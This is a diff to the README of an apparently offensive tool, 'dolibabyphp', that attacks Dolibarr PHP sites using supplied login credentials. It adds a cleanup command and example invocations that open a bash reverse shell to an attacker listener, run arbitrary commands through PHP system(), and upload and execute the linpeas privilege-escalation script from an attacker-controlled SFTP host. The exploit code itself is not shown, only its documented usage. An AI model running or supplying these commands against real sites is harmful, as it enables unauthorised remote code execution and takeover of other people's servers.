@@ -34,6 +34,7 @@ Options:
 
 Commands:
   bash-reverse-shell     Spawns a bash shell on the victim machine and...
+  cleanup                Runs the cleanup script on the target for given site...
   custom-php-payload     Specify your own PHP payload to be run on the victim...
   custom-system-payload  Specify your own payload to be run via PHP system()...
   sftp                   SFTPs to the attacker machine, downloads the...
@@ -46,4 +47,13 @@ In order to run the project from the source code, make sure you add the `src/` d
 
 ```shell
 PYTHONPATH="$(pwd)/src/" python -m dolibabyphp
+
+# Reverse shell with Bash
+PYTHONPATH="$(pwd)/src/" python -m dolibabyphp http://example.com/ username1 pass_word23 bash-reverse-shell --lhost 1.2.3.4 --lport 4444
+
+# Testing with a proxy
+PYTHONPATH="$(pwd)/src/" python -m dolibabyphp --proxy http://127.0.0.1:8080 http://example.com/ username1 pass_word23 custom-system-payload --payload "uname -a"
+
+# SFTP linpeas and execute it
+PYTHONPATH="$(pwd)/src/" python -m dolibabyphp -o ./linpeas-output.txt http://example.com/ username1 pass_word23 sftp --private-key-file ./id_ed25519 sftp://me@1.2.3.4:2222/linpeas.sh ./style.css
 ```
